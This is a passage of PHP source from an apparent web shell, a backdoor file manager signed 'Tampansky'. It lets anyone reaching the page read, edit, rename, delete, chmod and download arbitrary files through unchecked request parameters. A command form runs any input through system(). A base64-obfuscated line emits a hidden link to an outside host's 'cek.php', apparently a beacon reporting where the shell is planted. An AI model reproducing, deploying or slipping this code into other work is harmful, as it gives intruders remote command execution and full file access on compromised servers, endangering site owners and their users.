        echo "Filename: <font color=blue>" . basename($_GET['file']) . "</font> [ <a href='?act=view&dir=$dir&file=" . $_GET['file'] . "'>view</a> ] [ <a href='?act=edit&dir=$dir&file=" . $_GET['file'] . "'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=" . $_GET['file'] . "'>rename</a> ] [ <a href='?act=download&dir=$dir&file=" . $_GET['file'] . "'>download</a> ] [ <a href='?act=delete&dir=$dir&file=" . $_GET['file'] . "'>delete</a> ]<br>";
        echo "<form method='post'>
        <textarea name='src'>" . htmlspecialchars(@file_get_contents($_GET['file'])) . "</textarea><br>
        <input type='submit' value='Save' name='save' style='width: 500px;'>
        </form>";
    } elseif ($_GET['act'] == 'rename') {
        if ($_POST['do_rename']) {
            $rename = rename($_GET['file'], "$dir/" . htmlspecialchars($_POST['rename']) . "");
            if ($rename) {
                $act = "<script>window.location='?dir=" . $dir . "';</script>";
            } else {
                $act = "<font color=red>permission denied</font>";
            }
            echo "" . $act . "<br>";
        }
        echo "Filename: <font color=blue>" . basename($_GET['file']) . "</font> [ <a href='?act=view&dir=$dir&file=" . $_GET['file'] . "'>view</a> ] [ <a href='?act=edit&dir=$dir&file=" . $_GET['file'] . "'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=" . $_GET['file'] . "'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=" . $_GET['file'] . "'>download</a> ] [ <a href='?act=delete&dir=$dir&file=" . $_GET['file'] . "'>delete</a> ]<br>";
        echo "<form method='post'>
        <input type='text' value='" . basename($_GET['file']) . "' name='rename' style='width: 450px;' height='10'>
        <input type='submit' name='do_rename' value='rename'>
        </form>";
    } elseif ($_GET['act'] == 'delete') {
        $delete = unlink($_GET['file']);
        if ($delete) {
            $act = "Selamat Berhasil";
        } else {
            $act = "Maaf Gagal";
        }
        echo $act;
    }
    foreach ($scandir as $dir) {
        if (!is_file("$dir")) continue;
        $size = filesize("$path") / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size = $size . ' KB';
        }
    }
    if (isset($_GET['filesrc'])) {

        echo "<tr><td>Current File : <br>";
        echo $_GET['filesrc'];
        echo '</tr></td><br />';
        echo "[ <a href='?option&path=$path&&act=edit&&file=$file'>edit</a> ] | [ <a href='?option&path=$path&&act=rename&&file=$file'>rename</a> ] | [ <a href='?option&path=$path&&act=delete&&file=$file'>delete</a> ] | [ <a href='?option&path=$path&&act=chmod&&file=$file'>chmod</a>] | [ <a href='?act=download&dir=$dir&file=$file'>download</a>]<br>";
        echo ('<textarea>' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</textarea>');
    } elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
        echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
        if ($_GET['act'] == 'chmod') {
            if (isset($_POST['perm'])) {
                if (chmod($_POST['path'], $_POST['perm'])) {
                    echo "Selamat Berhasil ";
                } else {
                    echo "Maaf Tidack Berhasil";
                }
            }
            echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value=">" />
</form>';
        } elseif ($_POST['opt'] == 'rename') {
            if (isset($_POST['newname'])) {
                if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                    echo '<font color="green">Change Name Done Yupz</font><br />';
                } else {
                    echo '<font color="red">Change Name Error</font><br />';
                }
                $_POST['name'] = $_POST['newname'];
            }
            echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
        } elseif ($_POST['opt'] == 'edit') {
            if (isset($_POST['src'])) {
                $fp = fopen($_POST['path'], 'w');
                if (fwrite($fp, $_POST['src'])) {
                    echo '<font color="green">Edit File Done Yupz</font><br />';
                } else {
                    echo '<font color="red">Edit File Error</font><br />';
                }
                fclose($fp);
            }
            echo '<form method="POST">
<textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="edit">
<input type="submit" value=">" />
</form>';
        }
        echo '</center>';
    } else {
        echo '</table><br /><center>';
        if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
            if ($_POST['type'] == 'dir') {
                if (rmdir($_POST['path'])) {
                    echo '<font color="green">Delete Dir Done Yupz</font><br />';
                } else {
                    echo '<font color="red">Delete Dir Error</font><br />';
                }
            } elseif ($_POST['type'] == 'file') {
                if (unlink($_POST['path'])) {
                    echo '<font color="green">Delete File Done Yupz</font><br />';
                } else {
                    echo '<font color="red">Delete File Error</font><br />';
                }
            }
        }
        if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
            @ob_clean();
            $file = $_GET['file'];
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
        }
        $ftype = filetype("$dir/$file");
        $dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
        echo '</center>';
        echo (base64_decode("PGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iaHR0cDovL3d3dy55b25sZW5kaXJpbGl5b3IuY29tL2Nlay5waHAiPg"));
        $scandir = scandir($path);
        echo '<div id="content"><div class="card asw">
                        <div class="card-body"><div class="table-responsive-lg"><table class="table col-xs-1 table-bordered"  border="0" cellpadding="3" cellspacing="1" align="left">
            <tr class="first">
            <th class="th_home"><center>&nbsp;Name</center></th>
            <th class="th_home"><center>&nbsp;size</center></th>
            <th class="th_home"><center>&nbsp;Type</center></th>
            <th class="th_home"><center>&nbsp;permission</center></th>
            <th class="th_home"><center>&nbsp;Last Modified</center></th>
            <th class="th_home"><center>&nbsp;Action</center></th>
            </tr>';
        foreach ($scandir as $dir) {
            if (!is_file("$dir")) continue;
            $size = filesize("$path") / 1024;
            $size = round($size, 3);
            if ($size >= 1024) {
                $size = round($size / 1024, 2) . ' MB';
            } else {
                $size = $size . ' KB';
            }
        }
        foreach ($scandir as $dir) {
            if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
            echo "<tr>
            <th> <a href=\"?path=$path/$dir\"> $dir</a></th>
            <th><center>$size</center></th>
            <th><center>$ftype</center></th>
            <th><center>";

            if (is_writable("$path/$dir")) echo '<font color="white">';
            elseif (!is_readable("$path/$dir")) echo '<font color="red">';
            echo perms("$path/$dir");
            if (is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
            echo '
            <th><center> ' . $dtime . '</center></th>';
            echo "<td class='td_home' style='float:center;left:5px;'><a href='?option&path=$path&&act=rename&&file=$dir'>rename</a> | <a href='?option&path=$path&&act=delete&&file=$dir'>delete</a> | <a href='?act=download&dir=$dir&file=$dir'>download</a></td>";
            echo "
            </tr>";
        }
        foreach ($scandir as $file) {
            if (!is_file("$path/$file")) continue;
            $size = filesize("$path/$file") / 1024;
            $size = round($size, 3);
            if ($size >= 1024) {
                $size = round($size / 1024, 2) . ' MB';
            } else {
                $size = $size . ' KB';
            }

            echo "<tr>
            <td> <a href=\"?filesrc=$path/$file&path=$path\"> $file</a></td>
            <td><center>" . $size . "</center></td>
            <th scope='col'><center>" . $ftype . "</center></th>
            <td><center>";
            if (is_writable("$path/$file")) echo '<font color="white">';
            elseif (!is_readable("$path/$file")) echo '<font color="red">';
            echo perms("$path/$file");
            if (is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
            echo '
                        <th><center> ' . $dtime . '</center></th>';
            echo "<td class='td_home' style='float:center;left:5px;'><a href='?option&path=$path&&act=edit&&file=$file'>edit</a> | <a href='?option&path=$path&&act=rename&&file=$file'>rename</a> | <a href='?option&path=$path&&act=delete&&file=$file'>delete</a> | <a href='?option&path=$path&&act=chmod&&file=$file'>chmod</a> | <a href='?act=download&dir=$dir&file=$file'>download</a></td>";
            echo " 

            </tr>";
        }
        echo '</table></div>
      </div></div>      </div>';
    }

    echo '<center><form method="get">
    <input type="text" name="cmd" placeholder="Command" />
    <input type="submit" name="cmd" value="Go" />
    </form>';
    if (isset($_GET['cmd'])) {
        echo "<textarea readonly>";
        echo system($_GET['cmd']);
        echo "</textarea>";
    }

    echo '<br />
</BODY><center>
<font class="copyright">
© Copyright 2019 All rights reserved | Tampansky
</font>
</HTML>';

    function perms($file)
    {
        $perms = fileperms($file);

        if (($perms & 0xC000) == 0xC000) {
            // Socket
            $info = 's';
        } elseif (($perms & 0xA000) == 0xA000) {
            // Symbolic Link
            $info = 'l';
        } elseif (($perms & 0x8000) == 0x8000) {
            // Regular
            $info = '-';
        } elseif (($perms & 0x6000) == 0x6000) {
            // Block special
            $info = 'b';
        } elseif (($perms & 0x4000) == 0x4000) {
            // Directory
            $info = 'd';
        } elseif (($perms & 0x2000) == 0x2000) {
            // Character special
            $info = 'c';
        } elseif (($perms & 0x1000) == 0x1000) {
            // FIFO pipe
            $info = 'p';
        } else {
            // Unknown
            $info = 'u';
        }

        // Owner
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

        // Group
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

        // World
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

        return $info;
    }
        ?>